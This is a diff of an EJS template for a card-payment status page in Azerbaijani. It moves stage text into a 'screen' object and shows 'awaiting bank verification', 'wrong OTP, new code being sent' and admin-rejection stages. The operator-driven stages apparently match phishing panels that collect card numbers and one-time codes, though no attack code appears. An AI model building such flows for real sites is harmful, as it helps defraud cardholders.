@@ -3,34 +3,27 @@
     <div style="max-width:640px;margin:0 auto">
       <div class="card">
         <div class="card__body text-center">
-          <% if (declined) { %>
+          <% if (screen.declined) { %>
             <h1 style="font-size:1.4rem"><%= t('status.rejected') %></h1>
-            <div class="alert alert--error"><%= order.adminNote || t('status.rejected') %></div>
-            <a href="/<%= locale %>/odenis/<%= order._id %>" class="btn btn--primary"><%= t('payment.title') %></a>
+            <div class="alert alert--error"><%= order.adminNote || 'Ödəniş rədd edildi.' %></div>
+            <a href="/<%= locale %>/odenis/<%= order._id %>" class="btn btn--primary">Yenidən cəhd et</a>
           <% } else { %>
             <div id="stageBox"
                  data-status-url="/api/payment/<%= order._id %>/status"
-                 data-stage="<%= stage %>"
-                 data-stage-seconds="<%= stageSeconds %>"
-                 data-seconds-left="<%= secondsLeft %>">
+                 data-order-id="<%= order._id %>"
+                 data-stage="<%= screen.stage %>"
+                 data-stage-seconds="<%= screen.stageSeconds %>"
+                 data-seconds-left="<%= screen.secondsLeft %>">
 
-              <h1 style="font-size:1.35rem" data-stage-title>
-                <% if (stage === 'wrong_code') { %>Kod təkrar göndərilir<% } else { %>Bank doğrulaması gözlənilir<% } %>
-              </h1>
+              <h1 style="font-size:1.35rem" data-stage-title><%= screen.title %></h1>
 
-              <div data-stage-alert class="alert alert--error" style="<%= stage === 'wrong_code' ? '' : 'display:none' %>">
-                <strong>Səhv 3-D kod daxil etmisiniz.</strong><br>Kod təkrar göndərilir…
+              <div data-stage-alert class="alert alert--error" style="<%= screen.wrongCode ? '' : 'display:none' %>">
+                <strong>Səhv OTP kodu daxil etmisiniz.</strong><br>Yeni kod göndərilir…
               </div>
 
               <%- include('../partials/countdown-ring') %>
 
-              <p class="sec-note" data-stage-note>
-                <% if (stage === 'wrong_code') { %>
-                  Yeni 3-D kod bank tərəfindən göndərilir. Zəhmət olmasa gözləyin.
-                <% } else { %>
-                  Kart məlumatlarınız bankın doğrulama mərkəzinə göndərildi. Təsdiqdən sonra OTP ekranı avtomatik açılacaq.
-                <% } %>
-              </p>
+              <p class="sec-note" data-stage-note><%= screen.note %></p>
 
               <dl class="kv" style="text-align:left;margin-top:20px">
                 <dt><%= t('payment.orderLabel') %></dt><dd><%= order.orderNo %></dd>
